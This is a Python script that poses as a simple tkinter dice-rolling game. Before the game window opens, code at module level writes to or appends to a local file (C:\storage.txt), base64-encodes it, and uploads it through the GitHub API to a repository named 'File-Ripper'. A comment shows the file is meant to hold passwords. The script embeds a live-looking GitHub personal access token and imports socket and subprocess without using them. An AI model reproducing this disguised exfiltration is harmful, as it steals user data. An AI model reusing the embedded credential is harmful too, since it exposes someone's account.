from tkinter import *
from tkinter import ttk
import random
import os,socket,subprocess,threading;
import base64
import requests

#github config
ghUsername = "dirkwillemse"
ghToken = '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'
ghRepo ='File-Ripper'
ipFile = 'C:\storage.txt'
ghBranch = 'master'
ghTarget = 'rips/storage.txt'
ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips/storage.txt'
ipPath ='C:\storage.txt'

def fcheck(path):
    return os.path.isfile(path)
    
def fileCreate():
    f = open(ipFile,'x') # creates file
    with open(ipFile, "a") as f: # opens the file and appends to it 
     f.write("Now the file has more content!") # write to the file add pws

def enc():
    with open(ipFile, 'rb') as file: # opens
     content = file.read() # reads file
     encoded_content = base64.b64encode(content).decode('utf-8') # encodes in base64
     with open(ipFile,'w') as f: # overides existing text
      f.write(encoded_content)
      return encoded_content


if fcheck(ipPath):
    print(f"{ipPath} is present")
    with open("C:\storage.txt", "a") as f: # opens the file and appends to it 
     f.write("Now the file has more content!")
else: 
    fileCreate()

enc()
enc_content = enc()
print(enc_content)

# --- HTTP Headers ---
headers = {
    "Authorization": f"token {ghToken}",
    "Accept": "application/vnd.github.v3+json"
}

# --- Get file SHA if it exists ---
def get_file_sha():
    response = requests.get(ghUrl, headers=headers)  # no /storage.txt here
    if response.status_code == 200:
        file_info = response.json()
        return file_info['sha']
    else:
        return None

# --- Get SHA first ---
sha = get_file_sha()


# --- Build payload ---
data = {
    "message": f"Add or update {ghTarget}",
    "branch": ghBranch,
    "content": enc_content
}

if sha:
    data["sha"] = sha  # Add sha if updating

# --- PUT request ---
upload_response = requests.put(ghUrl, headers=headers, json=data)  # no /storage.txt here

if upload_response.status_code == 200:
    print(f"File uploaded successfully to {ghTarget}!")
else:
    print(f"Failed to upload file. Status code: {upload_response.status_code}")
    print(upload_response.json())



def roll():
    dice = random.randint(1,6)
    num_label['text'] = str(dice)

root = Tk()
frm = ttk.Frame(root, padding=100)
frm.grid()
ttk.Label(frm, text="Roll the dice").grid(column=0, row=0)
ttk.Button(frm, text="Roll", command=roll).grid(column=1, row=0)
ttk.Label(frm, text="Number:").grid(column=0,row=2)
num_label = ttk.Label(frm, text="")
num_label.grid(column=1,row=2)
root.mainloop()


